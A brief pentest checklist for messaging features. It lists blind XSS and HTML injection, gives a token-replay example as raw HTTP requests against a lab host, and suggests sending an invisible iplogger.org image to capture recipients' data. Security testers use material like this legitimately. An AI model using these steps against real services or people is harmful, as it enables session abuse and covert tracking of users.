# Messaging Features

* [ ] Blind \[\[XSS\_HTML Injection]]
*   [ ] Replay Attacks

    ```python
    # Try token Re-Use
    # U send Message 
    PUT /v1/api/messages/send?token=RWFzdGVyIGVnZyEgWW91RhdGEg=
    HTTP/1.1
    Host: vulnlab.com
    Content-Type: application/json
    {‘msg’: ‘Hi there! I will meet you at my place at 9pm today..’}

    --------------------------------------
    # U Then logout
    GET /v1/api/messages/logout?token=RWFzdGVyIGVnZyEgWW91RhdGEg=
    HTTP/1.1
    Host: vulnlab.com
    Content-Type: application/json 
    ---------------------------------------------------------
    We can then try to resend the request multiple times using the old token but with
    different messages.

    If the request was successful and no different status code was returned, it means
    we are able to flood the application using the session data of an old user.
    ```
*   [ ] Markup Language? try [**Create A picture that steals Data**](https://medium.com/@iframe\_h1/a-picture-that-steals-data-ff604ba1012)

    ```python
    Go to <https://iplogger.org/>
    choose invisible image 
    send the message 
    ```
* [ ] \[\[XSS\_HTML Injection|XSS\_HTML Injection]] in email section
